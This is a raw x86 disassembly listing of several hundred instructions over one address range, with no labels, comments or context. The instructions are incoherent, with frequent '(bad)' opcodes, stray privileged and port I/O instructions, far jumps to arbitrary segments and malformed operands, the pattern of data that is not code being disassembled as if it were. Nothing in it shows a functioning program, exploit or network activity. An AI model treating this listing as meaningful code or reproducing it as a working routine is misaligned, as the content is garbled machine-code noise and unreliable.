  413db0:	rcl    bl,1
  413db2:	add    al,0x38
  413db4:	stc    
  413db5:	fld    TBYTE PTR [ebx+0x1467b3f4]
  413dbb:	cli    
  413dbc:	ror    BYTE PTR [eax-0x5ffa22b2],cl
  413dc2:	jmp    0x413da7
  413dc4:	jecxz  0x413d93
  413dc6:	inc    edi
  413dc7:	daa    
  413dc8:	pop    esp
  413dc9:	mov    esp,0x1ad92f87
  413dce:	ins    BYTE PTR es:[edi],dx
  413dcf:	pusha  
  413dd0:	sbb    edx,DWORD PTR [ebp+0x67]
  413dd3:	sar    bh,1
  413dd5:	add    ebx,DWORD PTR [edi+0x2a]
  413dd8:	mov    bl,0xa5
  413dda:	sub    eax,0x15e3ba7d
  413ddf:	jg     0x413d61
  413de1:	nop
  413de2:	pop    eax
  413de3:	dec    ecx
  413de4:	test   edx,0x2dc110c1
  413dea:	leave  
  413deb:	xor    edx,ebx
  413ded:	jg     0x413e45
  413def:	sub    esi,DWORD PTR [eax]
  413df1:	and    dh,BYTE PTR [ebx]
  413df3:	inc    ebp
  413df4:	icebp  
  413df5:	rol    al,cl
  413df7:	inc    esi
  413df8:	and    al,0x75
  413dfa:	sbb    BYTE PTR [esi-0x26],0x5c
  413dfe:	ret    0x3995
  413e01:	dec    edx
  413e02:	icebp  
  413e03:	les    edx,FWORD PTR [edi+0x2e]
  413e06:	jae    0x413dc9
  413e08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e09:	gs aam 0x9f
  413e0c:	fstp   QWORD PTR [esi]
  413e0e:	push   es
  413e0f:	jae    0x413dfa
  413e11:	int    0xbf
  413e13:	enter  0xeb3a,0x5c
  413e17:	ror    bh,0xfa
  413e1a:	sbb    eax,0xf62e208f
  413e1f:	lods   eax,DWORD PTR ds:[esi]
  413e20:	add    eax,0x779295d1
  413e25:	pandn  mm6,mm5
  413e28:	inc    eax
  413e29:	mov    dl,0xbe
  413e2b:	add    eax,0x529cecab
  413e30:	pushf  
  413e31:	push   eax
  413e32:	mov    bh,0x93
  413e34:	or     al,0x75
  413e36:	sar    dl,cl
  413e38:	jge    0x413e63
  413e3a:	xchg   esi,eax
  413e3b:	stos   BYTE PTR es:[edi],al
  413e3c:	inc    eax
  413e3d:	out    dx,eax
  413e3e:	les    eax,FWORD PTR [ebp+0x5a8bd4ab]
  413e44:	sub    dl,BYTE PTR [ecx]
  413e46:	in     al,0x89
  413e48:	mov    esi,0x90f35509
  413e4d:	aad    0x42
  413e4f:	xchg   ebx,eax
  413e50:	arpl   WORD PTR [esi-0x30411ae9],cx
  413e56:	and    esi,DWORD PTR [edx-0x2]
  413e59:	mov    ch,0x95
  413e5b:	or     cl,BYTE PTR [esi+0x2e]
  413e5e:	xor    eax,0x59079d51
  413e63:	(bad)  
  413e64:	repnz gs adc eax,0x173f6e8c
  413e6b:	cmc    
  413e6c:	repnz sub DWORD PTR [edi+0x1a596b79],0xffffffc8
  413e74:	mov    bh,0x8a
  413e76:	and    eax,0xacaa4996
  413e7b:	lds    eax,FWORD PTR [eax+0x56]
  413e7e:	data16 repnz mov gs,WORD PTR [ebp-0x28]
  413e83:	ja     0x413e0f
  413e85:	shl    BYTE PTR [edx],0x55
  413e88:	mov    ah,0x1a
  413e8a:	lahf   
  413e8b:	and    al,0x76
  413e8d:	pop    es
  413e8e:	push   ss
  413e8f:	ret    0x1a25
  413e92:	scas   al,BYTE PTR es:[edi]
  413e93:	jno    0x413e3c
  413e95:	or     BYTE PTR [edi+0x26],bh
  413e98:	imul   edi,eax,0xddfbd009
  413e9e:	cmp    DWORD PTR [ebx-0x437cd9bf],edx
  413ea4:	add    BYTE PTR [eax+ebp*4+0x20ab56aa],cl
  413eab:	int    0x76
  413ead:	push   es
  413eae:	das    
  413eaf:	dec    eax
  413eb0:	sbb    edx,edx
  413eb2:	mov    cl,BYTE PTR [ebx]
  413eb4:	and    al,0x58
  413eb6:	mov    al,0x87
  413eb8:	sub    DWORD PTR ds:0x4de0e970,0x72b2ec22
  413ec2:	jo     0x413f12
  413ec4:	pop    ecx
  413ec5:	popf   
  413ec6:	cmp    eax,0xcdb94152
  413ecb:	dec    ebp
  413ecc:	mov    ds:0xcc077ad9,eax
  413ed1:	dec    ecx
  413ed2:	pop    ss
  413ed3:	xchg   ebx,eax
  413ed4:	fild   WORD PTR [edx-0x14]
  413ed7:	leave  
  413ed8:	or     BYTE PTR [edi],bl
  413eda:	pop    si
  413edc:	sahf   
  413edd:	sbb    dh,ch
  413edf:	es sub eax,0x250ca932
  413ee5:	sbb    eax,0xf4c2fd72
  413eea:	pushf  
  413eeb:	pop    ecx
  413eec:	jg     0x413ee0
  413eee:	loope  0x413f4a
  413ef0:	stc    
  413ef1:	xor    eax,0x99633264
  413ef6:	pop    ebx
  413ef7:	icebp  
  413ef8:	iret   
  413ef9:	pop    ss
  413efa:	mov    ebp,0x2be85e7
  413eff:	push   eax
  413f00:	adc    al,0xd8
  413f02:	stos   DWORD PTR es:[edi],eax
  413f03:	push   edi
  413f04:	mov    bh,0x21
  413f06:	push   ds
  413f07:	dec    ebx
  413f08:	cmp    ebp,DWORD PTR [ecx-0x3e50ccb1]
  413f0e:	arpl   bp,di
  413f10:	call   DWORD PTR [eax-0x7]
  413f13:	xchg   ecx,eax
  413f14:	and    esi,DWORD PTR [ebx-0x73]
  413f17:	popa   
  413f18:	ja     0x413f5b
  413f1a:	inc    esp
  413f1b:	xchg   ecx,eax
  413f1c:	pop    ecx
  413f1d:	mov    edx,0x55142842
  413f22:	mov    DWORD PTR ds:0xb5ff3662,ebx
  413f28:	imul   ebx,DWORD PTR [ecx*2+0x3bf64f16],0x42898af6
  413f33:	jecxz  0x413f24
  413f35:	xor    BYTE PTR [edx-0x20],ch
  413f38:	cmc    
  413f39:	jecxz  0x413f80
  413f3b:	xchg   esp,eax
  413f3c:	dec    ebx
  413f3d:	ret    0xf017
  413f40:	mov    BYTE PTR [eax+edx*2+0x30458434],bh
  413f47:	mov    eax,ds:0x5a427627
  413f4c:	mov    WORD PTR [edi+0x74],?
  413f4f:	xchg   ebx,eax
  413f50:	fsubr  QWORD PTR [ecx-0x4f52c22f]
  413f56:	fmul   QWORD PTR [ebx-0x4eba69c1]
  413f5c:	cld    
  413f5d:	xor    eax,0x937f0e6
  413f62:	scas   eax,DWORD PTR es:[edi]
  413f63:	xchg   ecx,eax
  413f64:	das    
  413f65:	scas   eax,DWORD PTR es:[edi]
  413f66:	mov    cl,0xc4
  413f68:	xlat   BYTE PTR ds:[ebx]
  413f69:	in     al,0xd2
  413f6b:	xchg   ebp,eax
  413f6c:	pop    edx
  413f6d:	jmp    0x413f1f
  413f6f:	mov    bh,0x23
  413f71:	mov    ch,0x49
  413f73:	test   al,dh
  413f75:	outs   dx,DWORD PTR ds:[esi]
  413f76:	out    dx,al
  413f77:	mov    dl,0xcb
  413f79:	dec    esi
  413f7a:	mov    eax,0x7612af62
  413f7f:	dec    esp
  413f80:	inc    eax
  413f81:	mov    ecx,0xb630d29c
  413f86:	mov    BYTE PTR [eax-0x542ba3d6],bl
  413f8c:	arpl   si,cx
  413f8e:	xor    esi,DWORD PTR [ebx-0x23]
  413f91:	int    0x65
  413f93:	test   al,0x51
  413f95:	jbe    0x413f58
  413f97:	adc    ebp,edx
  413f99:	mov    ds:0x38b7ee5b,eax
  413f9e:	xor    al,0x7b
  413fa0:	mov    ebp,DWORD PTR [eax]
  413fa2:	jbe    0x413f91
  413fa4:	(bad)  
  413fa5:	pop    ecx
  413fa6:	mov    edi,0xe3549481
  413fab:	pop    ds
  413fac:	and    eax,0x1b7faf6d
  413fb1:	xor    eax,DWORD PTR [eax+0x20]
  413fb4:	mov    ch,ch
  413fb6:	imul   ebp,eax,0x2c88dd4
  413fbc:	pop    edx
  413fbd:	xchg   dx,ax
  413fbf:	or     eax,0xe6a5739b
  413fc4:	mov    bh,0x4c
  413fc6:	inc    edi
  413fc7:	aam    0x94
  413fc9:	add    al,0xf2
  413fcb:	xchg   ebp,eax
  413fcc:	jno    0x413fea
  413fce:	pop    eax
  413fcf:	push   ss
  413fd0:	adc    BYTE PTR [ebp-0xc355abf],al
  413fd6:	push   es
  413fd7:	sub    al,0x31
  413fd9:	popf   
  413fda:	lds    edi,FWORD PTR [ebx-0x75]
  413fdd:	and    eax,0x43ceae95
  413fe2:	outs   dx,BYTE PTR ds:[esi]
  413fe3:	add    bl,bh
  413fe5:	dec    esp
  413fe6:	dec    esi
  413fe7:	jae    0x41405a
  413fe9:	int    0x2e
  413feb:	fs out 0xe1,eax
  413fee:	mov    bh,0x52
  413ff0:	jg     0x413fd2
  413ff2:	push   eax
  413ff3:	outs   dx,DWORD PTR ds:[esi]
  413ff4:	mov    ch,0xf7
  413ff6:	stc    
  413ff7:	test   eax,0x4ea478d9
  413ffc:	std    
  413ffd:	mov    WORD PTR [ecx],fs
  413fff:	cli    
  414000:	xor    BYTE PTR [edi-0x29b3f4a3],0x89
  414007:	sbb    eax,0xda185d53
  41400c:	cmp    BYTE PTR [esi+0x6cc771b0],dl
  414012:	jbe    0x413fa8
  414014:	test   ebx,ecx
  414016:	dec    ecx
  414017:	adc    DWORD PTR [ebp-0x62],edi
  41401a:	cmp    eax,0x2d118a9d
  41401f:	sub    ecx,DWORD PTR [ebx+0x57]
  414022:	mov    bh,0x68
  414024:	jmp    0xd07feaa4
  414029:	lock sbb eax,0xcb9dbfd1
  41402f:	sub    ecx,DWORD PTR [ebp-0x4f]
  414032:	or     BYTE PTR [edi+0x19],bh
  414035:	sbb    esp,DWORD PTR [edx-0x47]
  414038:	jnp    0x413fd8
  41403a:	dec    esp
  41403b:	push   0xe700f83d
  414040:	test   BYTE PTR [edx],cl
  414042:	adc    al,0x4
  414044:	es or  al,0x68
  414047:	add    ch,BYTE PTR [edx]
  414049:	xchg   ecx,eax
  41404a:	in     eax,dx
  41404b:	adc    BYTE PTR [eax+0x5637ad1a],ch
  414051:	mov    ss,edi
  414053:	push   ebx
  414054:	mul    DWORD PTR [ebp+0x23630f82]
  41405a:	adc    ch,BYTE PTR [ecx]
  41405c:	jo     0x41407a
  41405e:	adc    bh,dl
  414060:	dec    edx
  414061:	popa   
  414062:	or     DWORD PTR [esi],esp
  414064:	mov    bl,0x93
  414066:	adc    esp,esp
  414068:	dec    esp
  414069:	jl     0x414071
  41406b:	int    0x11
  41406d:	aad    0xa0
  41406f:	or     eax,0x32eff0a7
  414074:	push   ss
  414075:	mov    ecx,0xada1711
  41407a:	retf   0xaedd
  41407d:	pop    ebx
  41407e:	sub    ebx,edi
  414080:	mov    dl,ah
  414082:	stos   DWORD PTR es:[edi],eax
  414083:	cmp    DWORD PTR [ebp+0x6e],esi
  414086:	pusha  
  414087:	repnz add dl,dl
  41408a:	das    
  41408b:	mov    ds:0x7d0ed175,al
  414090:	in     eax,dx
  414091:	adc    al,0xe1
  414093:	nop
  414094:	test   al,0x7
  414096:	arpl   ax,bx
  414098:	out    dx,al
  414099:	js     0x4140c1
  41409b:	adc    esp,DWORD PTR [ebx-0x1369f08b]
  4140a1:	dec    edx
  4140a2:	xchg   dh,al
  4140a4:	push   eax
  4140a5:	cs ja  0x414080
  4140a8:	mov    cl,0x38
  4140aa:	cmp    BYTE PTR [ecx],ch
  4140ac:	add    ebp,DWORD PTR [ebp+0x33]
  4140af:	mov    bl,0x7b
  4140b1:	lods   eax,DWORD PTR ds:[esi]
  4140b2:	dec    ebp
  4140b3:	in     eax,0x17
  4140b5:	dec    esi
  4140b6:	stos   BYTE PTR es:[edi],al
  4140b7:	or     eax,0x9d68142d
  4140bc:	fucom  st(7)
  4140be:	and    BYTE PTR [edi+0x4241789a],cl
  4140c4:	mul    DWORD PTR [esi+0x1b36b249]
  4140ca:	add    ebx,esi
  4140cc:	dec    esp
  4140cd:	add    eax,edi
  4140cf:	jg     0x414054
  4140d1:	mov    bh,BYTE PTR [esi]
  4140d3:	stos   BYTE PTR es:[edi],al
  4140d4:	outs   dx,BYTE PTR ds:[esi]
  4140d5:	lods   eax,DWORD PTR ds:[esi]
  4140d6:	outs   dx,BYTE PTR ds:[esi]
  4140d7:	cmc    
  4140d8:	adc    BYTE PTR [edi+0x9e66e0a],dl
  4140de:	sub    eax,DWORD PTR [ebx+ebp*8+0x49b550b1]
  4140e5:	inc    esp
  4140e6:	das    
  4140e7:	pusha  
  4140e8:	mov    WORD PTR [esi+ebx*8],gs
  4140eb:	pop    esp
  4140ec:	adc    al,0x1a
  4140ee:	scas   al,BYTE PTR es:[edi]
  4140ef:	jb     0x414147
  4140f1:	push   0xffffffd8
  4140f3:	jge    0x414101
  4140f5:	cwde   
  4140f6:	ja     0x4140b2
  4140f8:	pop    ebx
  4140f9:	pop    ecx
  4140fa:	cmp    BYTE PTR [edx],ch
  4140fc:	push   es
  4140fd:	push   edi
  4140fe:	ret    0x1574
  414101:	xchg   edi,eax
  414102:	jmp    0x7a55:0xb5ddd7b3
  414109:	daa    
  41410a:	xchg   edi,eax
  41410b:	ror    DWORD PTR [ecx+0x37c111cf],1
  414111:	mov    edi,0x3c184ab9
  414116:	ja     0x414142
  414118:	add    ebp,eax
  41411a:	stos   BYTE PTR es:[edi],al
  41411b:	mov    dh,0x84
  41411d:	or     esp,edx
  41411f:	or     eax,0xfbac6ba4
  414124:	push   esi
  414125:	mov    ebp,0xfe6ede6e
  41412a:	repz push ds
  41412c:	pcmpgtb mm0,QWORD PTR [eax-0x28f79d1d]
  414133:	les    edi,FWORD PTR [ebx-0x4acd93d1]
  414139:	mov    DWORD PTR [ebx],0x71f642ca
  41413f:	adc    al,0xba
  414141:	dec    esp
  414142:	and    eax,0xa96fb354
  414147:	(bad)  
  414148:	sub    bh,al
  41414a:	mov    eax,ds:0xb1654c61
  41414f:	mov    ebx,0xf09705d5
  414154:	push   ds
  414155:	and    bl,BYTE PTR [ebx+0x51]
  414158:	mov    ss,WORD PTR [ecx+0x3e2c0231]
  41415e:	mov    DWORD PTR [ecx],ecx
  414160:	sti    
  414161:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414162:	outs   dx,DWORD PTR ds:[esi]
  414163:	iret   
  414164:	sub    BYTE PTR [ecx+0x7476ff7d],ch
  41416a:	mov    ecx,0xfad39824
  41416f:	lock sbb BYTE PTR [eax],bh
  414172:	shr    BYTE PTR [eax-0x68f936bd],cl
  414178:	lods   eax,DWORD PTR ds:[esi]
  414179:	call   0xe5819e63
  41417e:	pop    edi
  41417f:	imul   BYTE PTR [esi-0x1b772d64]
  414185:	push   cs
  414186:	enter  0xf3ad,0xed
  41418a:	mov    edi,0x7c7426bd
  41418f:	pop    ecx
  414190:	jb     0x414196
  414192:	loopne 0x4141cf
  414194:	mul    DWORD PTR [ecx+0x753e50d]
  41419a:	push   ds
  41419b:	mov    DWORD PTR [esi+0x7209287d],edi
  4141a1:	cs out dx,al
  4141a3:	out    dx,al
  4141a4:	in     eax,dx
  4141a5:	aaa    
  4141a6:	push   0xffffffab
  4141a8:	addr16 lock jge 0x4141d5
  4141ac:	sbb    eax,0xbce5561c
  4141b1:	test   BYTE PTR [esi+0x2be52118],0x56
  4141b8:	ret    0x1810
  4141bb:	inc    ecx
  4141bc:	clc    
  4141bd:	int    0x2b
  4141bf:	mov    BYTE PTR [edx+0x45],ah
  4141c2:	mov    esi,0xd9842b03
  4141c7:	cli    
  4141c8:	mov    dh,0x8d
  4141ca:	and    bh,BYTE PTR [esi+0x624b4437]
  4141d0:	jle    0x414213
  4141d2:	jge    0x4141e6
  4141d4:	dec    ebp
  4141d5:	lods   eax,DWORD PTR ds:[esi]
  4141d6:	or     al,0x34
  4141d8:	adc    al,0x3e
  4141da:	push   ebx
  4141db:	sbb    al,0xf0
  4141dd:	pusha  
  4141de:	push   0x29a17054
  4141e3:	fs dec ebp
  4141e5:	clc    
  4141e6:	imul   ebp,DWORD PTR [ecx+0x73],0x526509b1
  4141ed:	push   0x257c96e6
  4141f2:	jp     0x41419a
  4141f4:	push   ebx
  4141f5:	in     eax,0x5a
  4141f7:	mov    eax,0x925d9713
  4141fc:	stc    
  4141fd:	ficomp WORD PTR [ecx+0x30733938]
  414203:	imul   ebp,DWORD PTR [edi],0x39e9e6fe
  414209:	mov    ebx,0x83380560
  41420e:	sub    bl,BYTE PTR [di]
  414211:	jbe    0x414247
  414213:	xor    BYTE PTR [esi],0x9e
  414216:	cs mov ebx,0x4ce84046
  41421c:	jo     0x414245
  41421e:	dec    ebx
  41421f:	sub    cl,cl
  414221:	inc    edi
  414222:	mov    ebp,DWORD PTR [edi]
  414224:	retf   0xb08b
  414227:	cmp    edi,DWORD PTR [ebp+0x6b]
  41422a:	out    0xd6,al
  41422c:	jmp    0x41426b
  41422e:	or     dl,BYTE PTR [ebp-0x76]
  414231:	sbb    DWORD PTR [edi],ecx
  414233:	cmp    dh,BYTE PTR [ebx+0x20]
  414236:	fstp   QWORD PTR [ebx+0x5c]
  414239:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41423a:	out    0x2e,eax
  41423c:	out    0x3a,al
  41423e:	sub    edi,DWORD PTR [edx+esi*4-0x36fe31f8]
  414245:	or     ah,bh
  414247:	lea    ebp,[eax+0x384fb7d6]
  41424d:	mov    ds:0x697f959a,al
  414252:	jne    0x414235
  414254:	xlat   BYTE PTR ds:[ebx]
  414255:	test   al,0x1b
  414257:	aam    0x8d
  414259:	stos   DWORD PTR es:[edi],eax
  41425a:	jne    0x41423e
  41425c:	lods   eax,DWORD PTR ds:[esi]
  41425d:	push   ebp
  41425e:	(bad)  
  41425f:	inc    BYTE PTR [ebx+0xe]
  414262:	cmp    BYTE PTR [edx+0x1cb0ece2],0x9d
  414269:	jae    0x414223
  41426b:	xchg   esp,eax
  41426c:	jmp    0xbbff:0xb86455a0
  414273:	into   
  414274:	sub    ecx,edx
  414276:	jp     0x4141ff
  414278:	jo     0x41420b
  41427a:	fisubr DWORD PTR ds:0xa21a49c
  414280:	stos   DWORD PTR es:[edi],eax
  414281:	pop    edi
  414282:	iret   
  414283:	adc    eax,DWORD PTR [ebx-0x44961811]
  414289:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41428a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41428b:	clc    
  41428c:	add    ch,ch
  41428e:	or     ebx,DWORD PTR ds:0x2559f8d4
  414294:	fdiv   st,st(6)
  414296:	hlt    
  414297:	inc    edi
  414298:	jb     0x41426c
  41429a:	xor    ebx,edx
  41429c:	daa    
  41429d:	test   eax,0x1e99af96
  4142a2:	aas    
  4142a3:	cmp    al,0xe0
  4142a5:	cs push es
  4142a7:	or     eax,0x271efb3c
  4142ac:	dec    edi
  4142ad:	loopne 0x414296
  4142af:	inc    ebp
  4142b0:	xor    dh,BYTE PTR [esi]
  4142b2:	cmp    edi,ecx
  4142b4:	xor    eax,0x6b3f749e
  4142b9:	add    DWORD PTR [esi+edi*8+0x227f7575],ecx
  4142c0:	cdq    
  4142c1:	xchg   BYTE PTR [ebp+0x4a],ah
  4142c4:	mov    edx,0x6a214f5b
  4142c9:	repnz dec ebx
  4142cb:	cwde   
  4142cc:	test   eax,0x5d75e994
  4142d1:	inc    edx
  4142d2:	pop    di
  4142d4:	pop    ebp
  4142d5:	adc    eax,0xbf143527
  4142da:	jnp    0x414287
  4142dc:	xchg   BYTE PTR [ebx-0x1166d8e2],bl
  4142e2:	adc    ebx,ecx
  4142e4:	sahf   
  4142e5:	rol    BYTE PTR [ecx-0x5d879422],1
  4142eb:	push   es
  4142ec:	data16 loop 0x414310
  4142ef:	mov    ch,0x44
  4142f1:	out    0x26,al
  4142f3:	pop    ds
  4142f4:	mov    ds:0x1cfe4d28,al
  4142f9:	enter  0xf198,0x5c
  4142fd:	scas   eax,DWORD PTR es:[edi]
  4142fe:	jmp    0x414303
  414300:	fcomp  st(1)
  414302:	push   ebp
  414303:	test   eax,0x3bbaccd
  414308:	mov    dh,0x12
  41430a:	jo     0x4142ba
  41430c:	pop    es
  41430d:	aad    0x26
  41430f:	(bad)  
  414310:	(bad)  
  414311:	jge    0x414306
  414313:	sbb    DWORD PTR [eax],0x68c1d8c2
  414319:	jbe    0x4142bd
  41431b:	mov    DWORD PTR [edi+0x33],edi
  41431e:	fs (bad) 
  414320:	into   
  414321:	stc    
  414322:	inc    ebx
  414323:	mov    al,BYTE PTR ds:0xe16f82f7
  414329:	mov    al,ds:0x74b50020
  41432e:	fadd   st,st(1)
  414330:	sub    dh,0xf8
  414333:	pop    ecx
  414334:	aad    0x7a
  414336:	fwait
  414337:	and    DWORD PTR [ebx-0x2b],edi
  41433a:	dec    ebx
  41433b:	xchg   esi,eax
  41433c:	and    al,0xa2
  41433e:	xchg   DWORD PTR [eax+eiz*2-0x27dd7d9],esp
  414345:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414346:	add    BYTE PTR [esi],dl
  414348:	popf   
  414349:	test   DWORD PTR [ecx+0x3],eax
  41434c:	daa    
  41434d:	push   edi
  41434e:	std    
  41434f:	mov    eax,0x6f1e7e9d
  414354:	add    bh,dl
  414356:	inc    esp
  414357:	stc    
  414358:	xchg   DWORD PTR [eax],ecx
  41435a:	bound  ebp,QWORD PTR [ebx-0x52]
  41435d:	inc    esp
  41435e:	xor    edx,DWORD PTR [ecx]
  414360:	xchg   edi,eax
  414361:	popf   
  414362:	retf   
  414363:	and    DWORD PTR [esi],0x77fa01d4
  414369:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41436a:	es out 0xcb,al
  41436d:	pop    ds
  41436e:	int3   
  41436f:	paddb  mm1,QWORD PTR [eax]
  414372:	rcl    DWORD PTR [esi],1
  414374:	and    al,0xce
  414376:	mov    WORD PTR [ebx+0x5d],?
  414379:	not    BYTE PTR [eax+0x65]
  41437c:	adc    dh,ch
  41437e:	mov    al,0x52
  414380:	pop    ss
  414381:	mov    WORD PTR [esp+eax*1-0x59574db5],ss
  414388:	imul   esp,DWORD PTR [ecx+edi*8-0x4752931c],0xb
  414390:	and    DWORD PTR [edx+0x15],ebx
  414393:	adc    al,0xaa
  414395:	and    BYTE PTR ds:0x4f3688d,dh
  41439b:	sahf   
  41439c:	xchg   ebx,eax
  41439d:	call   0x4999:0x507d6f59
  4143a4:	rcr    BYTE PTR ds:0xcee2a72e,cl
  4143aa:	mov    ebx,0x651becbb
  4143af:	in     al,dx
  4143b0:	popf   
  4143b1:	xchg   DWORD PTR [esi],esp
  4143b3:	sbb    ebp,esi
  4143b5:	or     al,0x60
  4143b7:	jle    0x41441e
  4143b9:	in     eax,dx
  4143ba:	push   esp
  4143bb:	popa   
  4143bc:	sti    
  4143bd:	dec    eax
  4143be:	sub    dl,BYTE PTR [ebx]
  4143c0:	stc    
  4143c1:	test   al,0x39
  4143c3:	ficomp DWORD PTR [ebx+0x73]
  4143c6:	mov    dl,0x8f
  4143c8:	jb     0x414390
  4143ca:	int3   
  4143cb:	dec    esp
  4143cc:	rcl    DWORD PTR [ebx],cl
  4143ce:	pop    edx
  4143cf:	ins    DWORD PTR es:[edi],dx
  4143d0:	adc    DWORD PTR [ebx],edx
  4143d2:	and    al,0xc4
  4143d4:	xchg   BYTE PTR [eax+esi*8-0x3c],bh
  4143d8:	dec    ebx
  4143d9:	push   esp
  4143da:	rcl    BYTE PTR [edx],1
  4143dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143dd:	jecxz  0x414446
  4143df:	mov    al,0x37
  4143e1:	aas    
  4143e2:	nop
  4143e3:	sbb    bh,BYTE PTR [ecx+edx*4+0x43]
  4143e7:	or     eax,0x8e0b4462
  4143ec:	aad    0x97
  4143ee:	jne    0x4143c2
  4143f0:	in     al,0xff
  4143f2:	jmp    0xd0ef3e87
  4143f7:	call   0xd41641a7
  4143fc:	dec    esp
  4143fd:	inc    ebp
  4143fe:	cwde   
  4143ff:	lock pop esp
  414401:	cwde   
  414402:	std    
  414403:	pop    ss
  414404:	sti    
  414405:	push   ebx
  414406:	aaa    
  414407:	jae    0x41445d
  414409:	test   dh,bh
  41440b:	add    ecx,0x7eef6741
  414411:	(bad)  
  414412:	std    
  414413:	inc    esi
  414414:	in     al,0x6f
  414416:	mov    eax,0xc3bc2ece
  41441b:	je     0x4143b2
  41441d:	int3   
  41441e:	out    0x1f,al
  414420:	adc    eax,0x82d96d0
  414425:	or     edx,ecx
  414427:	call   0x71fc:0x956c8d64
  41442e:	push   ebp
  41442f:	jns    0x414403
  414431:	fisub  DWORD PTR [ebx+ecx*1]
  414434:	nop
  414435:	stos   BYTE PTR es:[edi],al
  414436:	ins    DWORD PTR es:[edi],dx
  414437:	sub    DWORD PTR [eax+0x3],esi
  41443a:	(bad)  
  41443b:	outs   dx,BYTE PTR ds:[esi]
  41443c:	icebp  
  41443d:	adc    ebx,DWORD PTR [ebx-0x30]
  414440:	fs ret 
  414442:	sbb    esi,esp
  414444:	aam    0x2f
  414446:	and    al,0x24
  414448:	pop    esp
  414449:	ds push 0x900b7402
  41444f:	loope  0x41447d
  414451:	xchg   ebx,eax
  414452:	adc    DWORD PTR [esi],edx
  414454:	mov    esp,0xead8af2f
  414459:	sbb    edx,DWORD PTR [ebx+0x3b77b95f]
  41445f:	jne    0x414422
  414461:	jno    0x414479
  414463:	mov    edx,0x179cf0ed
  414468:	rcr    BYTE PTR [esi-0x2f],1
  41446b:	sub    al,0xec
  41446d:	adc    DWORD PTR [edx+ebp*4+0x61],eax
  414471:	and    al,0x3b
  414473:	fadd   DWORD PTR [esi]
  414475:	pop    esp
  414476:	xor    al,cl
  414478:	push   ss
  414479:	cmp    al,0x73
  41447b:	(bad)  
  41447c:	lock hlt 
  41447e:	je     0x41440d
  414480:	mov    edi,0xb0445038
  414485:	xor    BYTE PTR [edx+0x90cb175],ch
  41448b:	jbe    0x41446d
  41448d:	dec    ecx
  41448e:	aam    0x23
  414490:	outs   dx,BYTE PTR ds:[esi]
  414491:	(bad)  
  414492:	rol    BYTE PTR [ebp+ecx*8-0x5c],cl
  414496:	inc    eax
  414497:	adc    DWORD PTR [esi-0x75],ecx
  41449a:	jmp    0xb2fde357
  41449f:	xor    al,BYTE PTR [esi]
  4144a1:	cdq    
  4144a2:	adc    dh,BYTE PTR [eax+0x2b]
  4144a5:	push   esp
  4144a6:	push   ebp
  4144a7:	test   al,0xbf
  4144a9:	adc    eax,0x8d32b789
  4144ae:	jmp    0x41449e
  4144b0:	sub    ebx,DWORD PTR [edi+0x72]
  4144b3:	or     eax,esp
  4144b5:	xchg   ebx,eax
  4144b6:	mov    ds:0xb6beee0,eax
  4144bb:	test   DWORD PTR [esi-0x4f],edx
  4144be:	je     0x4144de
  4144c0:	cmp    al,0xd4
  4144c2:	das    
  4144c3:	daa    
  4144c4:	pop    edi
  4144c5:	dec    esp
  4144c6:	test   BYTE PTR [edi],bh
  4144c8:	push   ebx
  4144c9:	fst    DWORD PTR [ebx]
  4144cb:	sbb    bh,BYTE PTR [ebx-0x717f7068]
  4144d1:	xor    BYTE PTR [eax+ecx*4+0xe],cl
  4144d5:	pusha  
  4144d6:	fidivr WORD PTR [esi+0xd]
  4144d9:	or     BYTE PTR es:0xc3b89bfe,0x96
  4144e1:	jp     0x414481
  4144e3:	fwait
  4144e4:	pop    ebp
  4144e5:	fs nop ebp
  4144e9:	xor    eax,0xa12caf02
  4144ee:	jge    0x414559
  4144f0:	aam    0x9
  4144f2:	cwde   
  4144f3:	xchg   DWORD PTR [ebx-0x16],esi
  4144f6:	sub    al,0x98
  4144f8:	adc    al,0x2b
  4144fa:	xor    BYTE PTR [edi],al
  4144fc:	imul   edx,DWORD PTR [esi-0x6a24e79f],0x1261349b
  414506:	inc    ecx
  414507:	adc    eax,0xed735b22
  41450c:	push   ebp
  41450d:	loopne 0x4144a0
  41450f:	pop    eax
  414510:	or     ch,dh
  414512:	ret    
  414513:	mov    cl,0x13
  414515:	mov    ebx,0x76086c9
  41451a:	mov    ds:0xfa0589ce,al
  41451f:	pop    ss
  414520:	cmp    DWORD PTR [esi-0x15],0x1fc43809
  414527:	mov    bh,0x30
  414529:	jo     0x41455b
  41452b:	xchg   edx,eax
  41452c:	scas   eax,DWORD PTR es:[edi]
  41452d:	out    dx,eax
  41452e:	ficomp WORD PTR [ebp-0x4]
  414531:	jg     0x41455c
  414533:	(bad)
  414537:	arpl   dx,ax
  414539:	pop    ds
  41453a:	dec    ecx
  41453b:	data16 arpl WORD PTR [edx],ax
  41453e:	mov    edx,0xe60d4b7f
  414543:	mov    dl,0x59
  414545:	aas    
  414546:	adc    BYTE PTR [ebp+0x78c15ace],0xb7
  41454d:	sbb    DWORD PTR [edi],edx
  41454f:	(bad)  
  414550:	fild   QWORD PTR [ecx+0x41]
  414553:	loope  0x414552
  414555:	adc    ch,BYTE PTR [edx+0x4f]
  414558:	repz jmp 0x41453c
  41455b:	ret    0x333f
  41455e:	dec    edi
  41455f:	fist   WORD PTR [edi+0x74]
  414562:	cmp    al,0x58
  414564:	add    DWORD PTR [edx+0xc],0xffffff8b
  414568:	jmp    0x4145a0
  41456a:	jns    0x41457f
  41456c:	dec    ebx
  41456d:	outs   dx,DWORD PTR ds:[esi]
  41456e:	dec    ecx
  41456f:	jne    0x414505
  414571:	cmp    BYTE PTR [edx],ch
  414573:	popf   
  414574:	ins    DWORD PTR es:[edi],dx
  414575:	inc    ebp
  414576:	aaa    
  414577:	or     DWORD PTR [ecx],esp
  414579:	fmul   st(6),st
  41457b:	push   esi
  41457c:	shl    DWORD PTR [ecx+0x51],cl
  41457f:	inc    ebp
  414580:	imul   eax,DWORD PTR [eax-0x2834f99a],0xf
  414587:	push   ecx
  414588:	outs   dx,BYTE PTR ds:[esi]
  414589:	push   ebx
  41458a:	push   esi
  41458b:	xor    al,0xef
